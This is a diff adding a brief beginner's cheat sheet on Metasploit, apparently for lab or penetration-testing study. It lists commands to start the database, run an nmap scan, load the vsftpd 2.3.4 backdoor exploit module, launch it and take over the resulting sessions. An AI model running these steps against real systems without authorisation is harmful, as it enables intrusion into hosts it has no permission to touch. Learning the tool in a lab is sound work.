@@ -1,0 +1,32 @@
+** Metasploit basics
+
+/etc/init.d/postgresql start
+	- starts metasploit database
+
+msfconsole
+	- opens the console to interact with exploits
+
+nmap -A (wordy scan) [IPaddress]
+
+search [vuln Name] ex:  search vsftp
+
+use exploit/path/to/exploit  ex:  use exploit/unix/ftp/vsftpd_234_backdoor
+
+show options (shows the require info.... supply info)
+
+exploit -j (run exploit quietly) 
+
+sessions -l  (list the running sessions) 
+
+sessions -i [#] interact with that particular setting 
+
+exit  (leave current vuln directory) 
+
+
+
+
+
+
+
+
+
